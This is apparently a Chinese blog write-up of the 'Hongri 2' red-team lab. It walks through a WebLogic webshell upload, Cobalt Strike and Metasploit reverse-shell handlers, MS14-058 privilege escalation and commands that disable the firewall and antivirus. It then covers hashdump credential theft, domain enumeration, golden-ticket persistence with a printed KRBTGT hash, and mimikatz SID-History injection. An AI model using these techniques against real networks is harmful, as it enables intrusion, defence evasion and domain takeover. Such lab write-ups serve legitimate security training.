---
title: 红日2
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-20T16:23:59+08:00
categories: 
- 渗透测试
- 靶机练习
---

## 环境搭建

添加新的网卡设置

![1](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\1.png)

pc主机为边界机，额外添加一张网卡即可

DC为内网机器，只需要一张网卡，web虚拟机同pc

三台机器默认密码均为1qaz@WSX

最终环境如下

|      | 外              | 内           |
| ---- | --------------- | ------------ |
| kali | 192.168.111.128 |              |
| web  | 192.168.111.80  | 10.10.10.80  |
| pc   | 192.168.111.201 | 10.10.10.201 |
| dc   |                 | 10.10.10.10  |

## web信息收集

目标web站点位于192.168.121.80的7001端口，首先对该ip进行端口的扫描

![2](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\2.png)

能够看到该ip还有一个iis站点，但是访问之后是什么都没有，扫描一下目录试试

![3](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\3.png)

也没找到什么有用的目录，7001端口为weblogic服务，利用对应的工具去扫描，这里采用weblogicscan

![4](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\4.png)

能看到扫出来几个漏洞

### 漏洞利用

根据扫描的结果进行漏洞测试，首先是位于

```
http://192.168.111.80:7001/console/login/LoginForm.jsp
```

的后台，可以尝试弱口令登录,网上的弱口令登录失败，尝试利用工具对其进行更详细的利用，网上找了一篇cve的复现

![5](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\5.png)

利用脚本进行shell上传，似乎是传上去了，但是执行命令出错，既然知道能够传码，尝试利用工具直接传个码上去

https://www.cnblogs.com/sstfy/p/10350915.html讲了关于weblogic木马上传目录的选择

![6](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\6.png)

上传成功后，访问`/console/framework/skins/wlsconsole/images/shell.jsp`,或是直接执行命令

![7](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\7.png)

能够成功执行命令了，并且权限为web,执行tasklist能够看到后台上线了360杀软

![8](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\8.png)

文件管理允许我们上传文件，启一个cs服务，利用cs生成windows.exe的payload,能够上传文件，但是是无法执行的，可以换一个shell连接蚁剑或者冰蝎等管理工具,换一个jsp码传到对应目录下名为antshell,jsp，蚁剑添加

```
http://192.168.111.80:7001/console/framework/skins/wlsconsole/images/antshell.jsp
```

![9](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\9.png)

成功上线，但是执行刚才上传的后门文件并没有上线cs,发现是换了监听ip导致的，重新传个文件上去执行，成功上线cs

![10](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\10.png)

查看一下本地用户权限

![11](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\11.png)

我们现在是de1ay用户，已经拥有管理员权限，还是尝试提一个system的权限，这里利用漏洞ms014-058成功提权

![12](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\12.png)

上线到system,关闭防火墙和杀软

```
netsh advfirewall set allprofiles state off 关闭防火墙
run killav 关闭杀软
```

## 内网信息收集

### 本机信息收集

![13](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\13.png)

![14](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\14.png)

![15](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\15.png)

能够看到该机器的内网ip为10.10.10.80

### 域信息收集

抓取明文密码，采用hashdump

![16](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\16.png)

能够抓取到DC的密码,使用mssql上线web机器

![17](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\17.png)

这个用户也收集不到信息，应该是环境出错了，去dc上打开computer browser再net view,pc的防火墙关闭，就可以看到了

![18](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\18.png)

```
net config workstation     // 查看当前计算机名，全名，用户名，系统版本，工作站域，登陆的域等
net view /domain              // 查看域
net time /domain           // 主域服务器会同时作为时间服务器
net user /domain      // 查看域用户
net group /domain     // 查看域内用户组列表
net group "domain computers" /domain      // 查看域内的机器
net group "domain controllers" /domain          // 查看域控制器组
net group "Enterprise Admins" /domain    // 查看域管理员组
```

大致的收集流程如上，最终大致结果如下

```
域控:DC(10.10.10.10)
PC:10.10.10.201
域成员:Administrator de1ay krbtgt mssql
域管理员:Administrator
工作站: pc, web
```

利用web服务器作为代理进行进一步探测，由于要用到msf中的模块，我先将shell发到msf上

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost xxxxxx   (本机ip)
set lport xxxx
exploit
```

好好好，更新了还是没传回去，老方法直接开socks隧道利用了，开一个6666的端口,但是代理无效，由于有了hash值，我们可以轻松的横向移动到pc和dc

![19](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\19.png)

这是因为PC的账户与dc相同，还是成功登录了

## 权限维持

### 黄金票据

黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，即使日后当域控权限掉了，也可以再通过域内其他任意机器伪造票据重新获取最高权限。

黄金票据的前提：

1.域名称
2.域的SID值
3.域的KRBTGT账户NTLM密码哈希
4.伪造用户名

在域控机器获得krbtgt账户ntlm密码哈希和sid

![20](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\20.png)

```
SID:S-1-5-21-2756371121-2868759905-3853650604-1001
KRBTGT: 82dfc71b72a11ef37d663047bc2088fb
```

![21](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\21.png)

利用cs生成黄金票据

![22](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\22.png)

利用生成的黄金票据可以在域控权限掉之后，伪造票据再次获得域控权限，例如添加域管账户

```
shell net user uu2fu3o 1q2w3e... /add /domain
```

![23](E:\笔记软件\笔记\渗透测试\靶机练习\红日2\23.png)

### SID-History

在Windows中，每个用户都有自己的SID。SID的作用主要是跟踪安全主体控制用户连接资源时的访问权限。

> 如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。在实战中，如果获得了域管理员权限，则可以将SID History作为实现持久化的方法。

在域控机器上新建一个恶意用户hacker

```
net user hacker hacku233 /add
```

使用shellcode_jnjection启动mimikatz,执行命令，将administrator的sid添加到恶意用户hacker的sid history属性中

```
privilege::debug
sid::patch
sid::add /sam:whoami /new:Administrator   //将Administrator的SID添加到whoami的SID History属性中
```

注意：在使用mimikatz注入SID之前，需要使用 sid::patch 命令修复NTDS服务，否则无法将高权限的SID注入低权限用户的SID History属性；mimikatz在2.1版本后，将 misc:addsid 模块添加到了 sid:add 模块下。

//由于环境问题，这里暂时只做一下记录，详细的以后再写

## 参考链接

http://www.yongsheng.site/2021/03/28/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%BA%8C%EF%BC%89/

https://www.viewofthai.link/2022/09/11/%E7%BA%A2%E6%97%A5att%EF%BC%86ck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%BA%8C%EF%BC%89/
